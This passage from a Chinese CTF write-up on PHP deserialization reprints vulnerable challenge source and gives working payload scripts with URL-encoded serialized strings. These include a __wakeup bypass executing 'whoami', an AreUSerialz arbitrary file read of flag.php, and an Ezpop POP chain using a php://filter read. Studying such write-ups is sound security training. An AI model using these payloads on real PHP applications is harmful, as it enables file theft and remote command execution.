class="variable">$data</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>运行结果展示,这里对象回收流程是<font color=red>先创建的后回收，类似与栈机制先进后出</font>。</li>
<li>代码分析这个<code>shell</code>类首先看见的就是<code>__wakeup</code>方法，将变量<code>command</code>赋值为空，然后就是<code>__destruct</code>方法，如果变量<code>command</code>不为空则执行该命令。然后我们可控点只有变量<code>data</code>，但是反序列化数据时，又要先调用<code>__wakeup</code>方法，因此我们如果想要执行命令则必须绕过这个方法。<code>Google</code>到这个方法可以通过<code>CVE-2016-7124</code>来绕过，只需增大序列化的数据即可。因此使用上面的<code>payload</code>即可。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">string</span>(<span class="number">43</span>) <span class="string">&quot;O:5:&quot;</span>shell<span class="string">&quot;:1:&#123;s:7:&quot;</span>command<span class="string">&quot;;s:6:&quot;</span>whoami<span class="string">&quot;;&#125;&quot;</span></span><br><span class="line">/</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP Notice:  unserialize(): Unexpected end of serialized data in /usercode/file.php on line <span class="number">24</span></span><br><span class="line">PHP Notice:  unserialize(): <span class="built_in">Error</span> at offset <span class="number">39</span> of <span class="number">40</span> bytes in /usercode/file.php on line <span class="number">24</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="PHP链构造"><a href="#PHP链构造" class="headerlink" title="PHP链构造"></a>PHP链构造</h2><h3 id="网鼎杯2020青龙组AreUSerialz"><a href="#网鼎杯2020青龙组AreUSerialz" class="headerlink" title="网鼎杯2020青龙组AreUSerialz"></a>网鼎杯2020青龙组AreUSerialz</h3><ul>
<li>这里可用上面两种方法来绕过：1—<code>PHP7.1</code>属性不敏感，2—大写<code>S</code>字符用十六进制。</li>
<li><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]AreUSerialz">BUUCTF 网鼎杯2020青龙组AreUSerialz</a>.</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>一上来就直接给的源码，首先看程序入口第74行，需要我们<code>GET[&#39;str&#39;]</code>然后再对我们所提交的数据进行反序列化，但是这里又有一个<code>is_valid()</code>函数对我们的输入进行了限制，大致就是遍历你的输入，对应字符的ASCII码必须再<code>32-125</code>意思就是可见字符，还不晓得为啥要这么写。再去看看<code>FileHander</code>类，发现定义的变量属性都是<code>protected</code>，这种属性反序列化又会是<code>%00*%00变量名</code>，则会出现不可见字符。再联系那个<code>is_valid()</code>函数清楚了。然后下其他函数<code>process</code>(),<code>write()</code>,<code>read()</code>,<code>output()</code>,功能就是函数名，分别是程序执行过程，文件写入，文件读取，输出，其中<code>OP</code>变量控制程序是读(2)还是写(1)。最后一个<code>__destruct()</code>,那么就是我们的漏洞点了。</li>
<li>分析完函数功能，就来看利用链。首先控制类变量<font color=red>绕过<code>is_vaild()</code></font>，然后然后到<code>__destruct()</code>，再进入程序控制<code>process()</code>,我们需要读文件则判断<font color=red>变量<code>OP==&#39;2&#39;</code></font>,进入<code>read()</code>函数，控制变量<code>filename</code>则造成任意文件读取。</li>
<li>于是用到上面的PHP特性知识点。<code>Google</code>插件<code>wappalyzer</code>看到网站是<code>PHP7.4.3</code>搭建的，变量<code>OP==2</code>发现<code>__destruct()</code>用的强等(变量类型和字符都必须相等)，但是后面用的弱等，那么则可绕过。</li>
<li>发现直接文件名设为<code>/flag.php</code>不得行，页面报错了，那么添上绝对路径<code>OK</code>,<code>flag</code>在源码里面。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> =<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">var_dump(serialize(<span class="keyword">new</span> FileHandler));</span><br><span class="line"><span class="comment">//O:11:&quot;FileHandler&quot;:2:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/flag.php&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span> =<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>=<span class="string">&quot;/var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exp</span> = (serialize(<span class="keyword">new</span> FileHandler));</span><br><span class="line"><span class="variable">$exp</span> = str_replace(<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;S&#x27;</span>, <span class="variable">$exp</span>);</span><br><span class="line"><span class="variable">$exp</span> = str_replace(chr(<span class="string">&#x27;0&#x27;</span>),<span class="string">&#x27;\00&#x27;</span>,<span class="variable">$exp</span>);</span><br><span class="line">print_r(urlencode(<span class="variable">$exp</span>));</span><br><span class="line"><span class="comment">//O%3A11%3A%22FileHandler%22%3A2%3A%7BS%3A5%3A%22%5C00%2A%5C00op%22%3Bi%3A2%3BS%3A11%3A%22%5C00%2A%5C00filename%22%3BS%3A22%3A%22%2Fvar%2Fwww%2Fhtml%2Fflag.php%22%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="MRCTF-2020-Ezpop"><a href="#MRCTF-2020-Ezpop" class="headerlink" title="MRCTF 2020 Ezpop"></a>MRCTF 2020 Ezpop</h3><ul>
<li><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[MRCTF2020]Ezpop">BUUCTF  MRCTF 2020 Epop</a>.总的来说就是构造利用链吧，看自己喜欢怎么寻找，一种是危险函数回溯方式，一种是根据可控参数寻找。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>总体来说就只有三个类，应该不算难。定位到危险函数<code>Modifier</code>类的<code>append</code>方法可以包含一个文件，可控参数<code>value</code>的话，那么造成任意文件包含。若要调用<code>append</code>方法必须调用魔术方法<code>__invoke</code>.而<code>invoke</code>方法又必须是把<code>Modifier</code>方法当做函数使用时才调用。</li>
<li>发现<code>Test</code>类中调用了<code>function</code>方法。而<code>function</code>方法又来自<code>Test</code>类中的<code>p</code>变量可控，可任意调用方法。但必须调用<code>__get</code>魔术方法才能任意调用方法，而<code>__get</code>魔术方法有必须是访问一个不存在的属性，或私有受保护的变量。</li>
<li>发现<code>Show</code>类中的<code>__toString</code>方法若<code>str</code>为<code>Test</code>类，那么则可调用<code>__get</code>方法，但<code>__toString</code>方法必须是将类当做字符处理才能触发。</li>
<li>反序列化执行之前，会先执行<code>__wakeup</code>方法，假如<code>Show</code>类中的<code>source</code>是一个类，这里的正则匹配则把这个类当成了字符处理，那么又会看这个类是否有<code>__toString</code>方法，有则自动调用，我们这里就自己调用自己，那么就会触发该<code>__toString</code>方法。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Show-&gt;wakeup---Show-&gt;toSring---Test-&gt;get---Modifier-&gt;invoke---Modifier-&gt;append</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str = <span class="keyword">new</span> Test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Show();</span><br><span class="line"><span class="variable">$a</span>-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line">print_r(urlencode(serialize(<span class="variable">$a</span>)));</span><br><span class="line"><span class="comment">// O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7D</span></span><br></pre></td></tr></table></figure>

<h2 id="PHP反序列化字符串逃逸"><a href="#PHP反序列化字符串逃逸" class="headerlink" title="PHP反序列化字符串逃逸"></a>PHP反序列化字符串逃逸</h2><h2 id="借用哈大佬们名言"><a href="#借用哈大佬们名言" class="headerlink" title="借用哈大佬们名言"></a>借用哈大佬们名言</h2><ul>
<li>任何具有一定结构的数据，<strong>如果经过了某些处理而把结构体本身的结构给打乱了</strong>，则有可能会产生漏洞。(记不得出处了)</li>
</ul>
<h3 id="0CTF-2016piapiapia"><a href="#0CTF-2016piapiapia" class="headerlink" title="0CTF 2016piapiapia"></a>0CTF 2016piapiapia</h3><ul>
<li>反序列化后长度递增</li>
<li>打开一个登录框，简单测了一下SQL注入，感觉不存在。于似乎扫了哈目录，发现存在源码泄露(<a target="_blank" rel="noopener" href="http://www.zip)./">www.zip)。</a></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span>.php           主要有Mysql(数据库的增删查改+WAF)，user(继承Mysql，函数实现一定的功能)</span><br><span class="line">config.php           配置文件，数据库的连接和flag</span><br><span class="line">index.php            登录</span><br><span class="line">profile.php          展示登录的个人信息和上传的图片</span><br><span class="line">register.php         注册用户</span><br><span class="line">update.php           文件上传</span><br></pre></td></tr></table></figure>

<ul>
<li>由于如果代码全部贴出来文章显得很长了，就展示主要代码吧，由于代码过滤了增删查改<font color=red>几乎</font>无法造成注入。那么就无法从注册登录这个点下手，发现<code>profile.php</code>那里有个文件读取函数，如果参数可能那么可能造成任意文件读取咯。</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// profile.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = unserialize(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = base64_encode(file_get_contents(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>回溯参数<code>$profile[&#39;photo&#39;]</code>来源，是反序列化<code>$profile</code>出来的，既然有反序列化，那么肯定有序列化.全局搜索<code>serialize</code>,定位到<code>update.php</code>文件。</li>
</ul>
